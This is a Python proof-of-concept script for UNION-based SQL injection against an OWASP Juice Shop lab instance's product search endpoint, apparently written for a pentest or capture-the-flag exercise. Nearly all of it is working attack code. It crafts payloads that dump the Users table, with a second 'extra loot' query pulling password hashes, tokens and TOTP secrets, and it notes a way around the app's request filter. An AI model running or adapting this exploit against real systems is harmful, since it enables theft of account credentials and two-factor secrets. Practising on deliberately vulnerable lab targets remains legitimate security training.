#!/usr/bin/env python3
"""
c05-sqli-union-dump
UNION-based SQL injection in OWASP Juice Shop /rest/products/search?q=
Target: http://host.docker.internal:3000 (own lab)

Injected query (SQLite):
  SELECT * FROM Products
   WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%') AND deletedAt IS NULL)
   ORDER BY name

Payload tail used:  apple')) UNION SELECT <cols> FROM Users-- 
  -> closes LIKE + OR-group: ( ... ))  then UNION, then comments out ORDER BY.

Products has 10 columns; Users has 13 -> we project 4 useful columns
(id, username, email, role) + a marker into column 10 so we can tell
injected rows apart from real product rows in the JSON response.
"""
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://host.docker.internal:3000/rest/products/search"
MARKER = "C05MARK"

# Column 1..10 of the Products SELECT. Users fields in 1..4, marker in 10.
PAYLOAD = (
    "apple')) UNION SELECT id,username,email,role,5,6,7,8,9,"
    f"'{MARKER}' FROM Users--"
)


def inject(q: str) -> dict:
    url = BASE + "?" + urllib.parse.urlencode({"q": q})
    req = urllib.request.Request(url, headers={"User-Agent": "c05-poc/1.0"})
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read().decode("utf-8", "replace")
    try:
        return json.loads(body)
    except json.JSONDecodeError:
        # Juice Shop returns an HTML error page on SQL errors
        raise SystemExit("Non-JSON response (SQL error?):\n" + body[:500])


def main() -> int:
    print("[*] Payload:", PAYLOAD)
    resp = inject(PAYLOAD)
    data = resp.get("data") or []

    # Injected rows are identifiable by our marker in the last projected column
    rows = [r for r in data if str(r.get("deletedAt")) == MARKER]
    if not rows:
        print("[!] No injected rows found; raw response:")
        print(json.dumps(resp, indent=2)[:1500])
        return 1

    # de-duplicate, keep DB order by id
    seen, users = set(), []
    for r in sorted(rows, key=lambda x: int(x["id"])):
        if r["id"] in seen:
            continue
        seen.add(r["id"])
        users.append(
            {
                "id": int(r["id"]),
                "username": r.get("name"),
                "email": r.get("description"),
                "role": r.get("price"),
            }
        )

    print(f"[+] Exfiltrated {len(users)} user rows via UNION injection\n")
    print(f"{'id':<4} {'email':<32} {'role':<12} username")
    print("-" * 78)
    for u in users:
        print(f"{u['id']:<4} {str(u['email']):<32} {str(u['role']):<12} {u['username']}")

    import os

    ev = "/workspace/evidence"
    os.makedirs(ev, exist_ok=True)

    # Primary deliverable: first 10 rows, email + role
    with open(os.path.join(ev, "c5_users.txt"), "w", encoding="utf-8") as f:
        f.write("# c05-sqli-union-dump - Users table exfiltrated via UNION SQLi\n")
        f.write("# target: %s?q=<injection>\n" % BASE)
        f.write("# payload: %s\n" % PAYLOAD)
        f.write("# format: email<TAB>role\n")
        for u in users[:10]:
            f.write(f"{u['email']}\t{u['role']}\n")

    # Extra loot: full dump incl. password hashes / TOTP secrets
    # NOTE: the app's request filter 404s on some literals (e.g. "lastLoginIp"),
    # so it is omitted here; 7 is used as a numeric placeholder.
    full = (
        "apple')) UNION SELECT id,username,email,password,role,deluxeToken,"
        "7,totpSecret,isActive,'C05MARK' FROM Users--"
    )
    resp2 = inject(full)
    rows2 = [r for r in (resp2.get("data") or []) if str(r.get("deletedAt")) == "C05MARK"]
    seen2, loot = set(), []
    for r in sorted(rows2, key=lambda x: int(x["id"])):
        if r["id"] in seen2:
            continue
        seen2.add(r["id"])
        loot.append(r)
    with open(os.path.join(ev, "c5_users_full.json"), "w", encoding="utf-8") as f:
        json.dump({"payload": full, "rows": loot}, f, indent=2)

    print(f"\n[+] Wrote {ev}/c5_users.txt (first {min(10, len(users))} rows: email + role)")
    print(f"[+] Wrote {ev}/c5_users_full.json ({len(loot)} rows, incl. password hashes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
